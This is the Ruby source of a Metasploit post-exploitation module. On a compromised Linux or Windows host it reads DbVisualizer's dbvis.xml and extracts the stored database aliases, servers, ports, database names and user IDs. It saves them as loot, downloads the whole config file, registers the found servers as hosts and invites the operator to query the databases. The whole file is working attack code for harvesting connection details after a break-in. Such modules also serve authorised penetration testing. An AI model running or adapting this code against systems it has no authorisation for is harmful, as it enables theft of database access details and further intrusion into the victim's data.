##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Dbvis Connections Settings',
        'Description'   => %q{
          DbVisualizer stores the user database configuration in dbvis.xml.
          This module retrieves the connections settings from this file.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'David Bloom' ], # Twitter: @philophobia78
        'Platform'      => %w{ linux win },
        'SessionTypes'  => [ 'meterpreter', 'shell']
      ))
  end

  def run
    db_table = Rex::Ui::Text::Table.new(
    'Header'    => "Dbvis Databases",
    'Indent'    => 2,
    'Columns'   =>
    [
      "Alias",
      "Type",
      "Server",
      "Port",
      "Database",
      "Namespace",
      "Userid",
    ])

    dbs = []

    case session.platform
    when /linux/
      user = session.shell_command("whoami").chomp
      print_status("Current user is #{user}")
      if (user =~ /root/)
        user_base = "/root/"
      else
         user_base="/home/#{user}/"
      end
      dbvis_file = "#{user_base}.dbvis/config70/dbvis.xml"
    when /win/
      if session.type =~ /meterpreter/
        user_profile = session.sys.config.getenv('USERPROFILE')
      else
        user_profile = cmd_exec("echo %USERPROFILE%").strip
      end
      dbvis_file = user_profile + "\\.dbvis\\config70\\dbvis.xml"
    end

    unless file?(dbvis_file)
      print_error("File not found: #{dbvis_file}")
      return
    end

    db = {}
    print_status("Reading: #{dbvis_file}")
    dbfound = false

    raw_xml = ""
    begin
      raw_xml = read_file(dbvis_file)
    rescue EOFError
      # If there's nothing in the file, we hit EOFError
      print_error("Nothing read from file: #{dbvis_file}, file may be empty")
      return
    end

    # read config file
    raw_xml.each_line do |line|
      if line =~ /<Database id=/
        dbfound = true
      elsif line =~ /<\/Database>/
        dbfound=false
        if db[:Database].nil?
          db[:Database] = "";
        end
        if db[:Namespace].nil?
          db[:Namespace] = "";
        end
        # save
        dbs << db if (db[:Alias] and db[:Type] and  db[:Server] and db[:Port] )
        db = {}
      end

      if dbfound == true
        # get the alias
        if (line =~ /<Alias>([\S+\s+]+)<\/Alias>/i)
          db[:Alias] = $1
        end

        # get the type
        if (line =~ /<Type>([\S+\s+]+)<\/Type>/i)
          db[:Type] = $1
        end

        # get the user
        if (line =~ /<Userid>([\S+\s+]+)<\/Userid>/i)
          db[:Userid] = $1
        end

        # get the server
        if (line =~ /<UrlVariable UrlVariableName="Server">([\S+\s+]+)<\/UrlVariable>/i)
          db[:Server] = $1
        end

        # get the port
        if (line =~ /<UrlVariable UrlVariableName="Port">([\S+]+)<\/UrlVariable>/i)
          db[:Port] = $1
        end

        # get the database
        if (line =~ /<UrlVariable UrlVariableName="Database">([\S+\s+]+)<\/UrlVariable>/i)
          db[:Database] = $1
        end

        # get the Namespace
        if (line =~ /<UrlVariable UrlVariableName="Namespace">([\S+\s+]+)<\/UrlVariable>/i)
          db[:Namespace] = $1
        end
      end
    end

    # print out
    dbs.each do |db|
      if ::Rex::Socket.is_ipv4?(db[:Server].to_s)
        print_good("Reporting #{db[:Server]} ")
        report_host(:host =>  db[:Server]);
      end

      db_table << [ db[:Alias] , db[:Type] , db[:Server], db[:Port], db[:Database], db[:Namespace], db[:Userid]]
    end

    if db_table.rows.empty?
      print_status("No database settings found")
    else
      print_line("\n")
      print_line(db_table.to_s)
      print_good("Try to query listed databases with dbviscmd.sh (or .bat) -connection <alias> -sql <statements> and have fun !")
      print_good("")
      # store found databases
      p = store_loot(
        "dbvis.databases",
        "text/csv",
        session,
        db_table.to_csv,
        "dbvis_databases.txt",
        "dbvis databases")
      print_good("Databases settings stored in: #{p.to_s}")
    end

    print_status("Downloading #{dbvis_file}")
    p = store_loot("dbvis.xml", "text/xml", session, read_file(dbvis_file), "#{dbvis_file}", "dbvis config")
    print_good "dbvis.xml saved to #{p.to_s}"
  end
end
